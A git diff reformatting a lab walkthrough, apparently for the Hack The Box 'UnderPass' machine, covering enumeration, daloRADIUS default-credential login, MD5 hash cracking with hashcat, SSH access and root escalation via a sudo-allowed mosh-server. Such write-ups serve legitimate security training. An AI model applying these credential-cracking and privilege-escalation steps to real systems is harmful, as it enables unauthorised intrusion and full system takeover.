@@ -2,7 +2,7 @@
 - 
 ## Nmap Enumeration
 - We pass the commands:
-	```bash
+	```
 nmap -sV -sC -vv 10.10.11.48
 nmap -sU --top-ports=10 -vv 10.10.11.48
 
@@ -27,7 +27,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ----
 ## SNMPwalk
 - t
-	```bash
+	```
 snmpwalk -v 1 -c public 10.10.11.48
 
 ---RELEVANT-OUTPUT---
@@ -42,53 +42,53 @@ iso.3.6.1.2.1.1.8.0 = Timeticks: (2) 0:00:00.02
 
 ```
 - crackmapexec/netexec
-	```bash
+	```
 
 ```
 ---
 ## Directory Enumeration
 - Gobuster:
 	- Directory
-		```bash
+		```
 gobuster dir -u http://underpass.htb dns --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.root
 ```
 	- SHowed some possible directories
 		- Next Directory
-			```bash
+			```
  gobuster dir -u http://underpass.htb/daloradius/app dns --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.root
 ```
 	- Found login page at /user and /operator
 	- /oprerator default creds work :administrator:radius
 		- There we see a db password: testing123 for steve
 		- We also see some creds under User Listing
-			![[Pasted image 20250425174906.png]]
+			![Pasted image 20250425174906.png](../Attachments/Pasted%20image%2020250425174906.png)
 		- If we click edit user, under attributes we see it's an MD5 hash:
-			![[Pasted image 20250425175023.png]]
+			![Pasted image 20250425175023.png](../Attachments/Pasted%20image%2020250425175023.png)
 			- Alternatively we take the password and check the length:
-			```bash
+			```
 echo -n "412DD4759978ACFCC81DEAB01B382403" | wc -c                              
 ---OUTPUT---
 32
 ```
 			- 32 characters means it'l likely an md5 hash
 			- We can crack via https://crackstation.net/
-				![[Pasted image 20250425175208.png]]
+				![Pasted image 20250425175208.png](../Attachments/Pasted%20image%2020250425175208.png)
 				- Alternatively we can crack via hashcat (or john if you know the format)
-					```bash
+					```
 hashcat -m 0 hash /usr/share/wordlists/rockyou.txt
 
 ---OUTPUT---
 412dd4759978acfcc81deab01b382403:underwaterfriends
 ```
 - We ssh into machine with credentials:
-	```bash
+	```
 ssh svcMosh@underpass.htb
 ```
 	- We grab user flag.
 ## Privilege Escalation
 - Note that it's time gated so if you encounter an error, maybe pass it quickly to see.
 - We pass:
-	```bash
+	```
 sudo -l
 
 ---OUTPUT---
@@ -101,7 +101,7 @@ User svcMosh may run the following commands on localhost:
 	- If we google mosh we see it's a mobile shell like ssh
 - We pass the command we can do as sudo
 	- On trying to pass the command I pressed Tab after /usr/bin/mosh and saw there were 2 more binaries mosh and mosh-client
-		```bash
+		```
 sudo /usr/bin/mosh-server 
 
 ---OUTPUT---
@@ -117,12 +117,12 @@ There is NO WARRANTY, to the extent permitted by law.
 ```
 		- Seems like it starts a server at port 60001
 - We pass netstat to see what IP:
-	```bash
+	```
 udp        0      0 0.0.0.0:60001           0.0.0.0:*                           off (0.00/0/0)
 ```
 	- We see it's localhost (0.0.0.0)
 - We try to pass mosh-client
-	```bash
+	```
 mosh-client
 
 ---OUTPUT---
@@ -136,7 +136,7 @@ Usage: mosh-client [-# 'ARGS'] IP PORT
        mosh-client -c
 ```
 	- Says we need to put the IP and port, we see the port when we pass mosh-server and we know it's localhost so we add it:
-		```bash
+		```
 mosh-client 0.0.0.0 60001
 
 ---OUTPUT---
@@ -144,17 +144,17 @@ MOSH_KEY environment variable not found.
 ```
 		- Note if some other user set it it would open a client and time out. would need to reset the machine or unset the value to know (but you can't know to unset if you don't see this error message) 
 	- When we pass mosh-server as sudo we also get a string of characters. Assuming it's the MOSH_KEY, we set the MOSH_KEY environment variable:
-		```bash
+		```
 export MOSH_KEY=jNt6nEuYmlfRYkPTN821YA
 ```
 	- Then pass the mosh-client command again:
-		```bash
+		```
 mosh-client 0.0.0.0 60001
 ```
 		- It opens up a new shell as root.
 - Alternatively we can also use the mosh command instead.
 - We pass the mosh command and see it's usage:
-	```bash
+	```
 mosh
 
 ---OUTPUT---
@@ -205,14 +205,14 @@ Mosh home page: https://mosh.org
 	- We see the mosh server argument which is by default set to mosh-server
 		- We can change that to do our sudo command
 	- We also have to specify user (optional) and host (which is our localhost)
-		```bash
+		```
 mosh --server='sudo /usr/bin/mosh-server' localhost
 --OR--
 mosh --server='sudo /usr/bin/mosh-server' svcMosh@localhost
 ```
 		- We should get into a shell immediately
 - Output for both methods:
-	![[Pasted image 20250425181623.png]]
+	![Pasted image 20250425181623.png](../Attachments/Pasted%20image%2020250425181623.png)
 	- We can grab the root flag
 
 -------
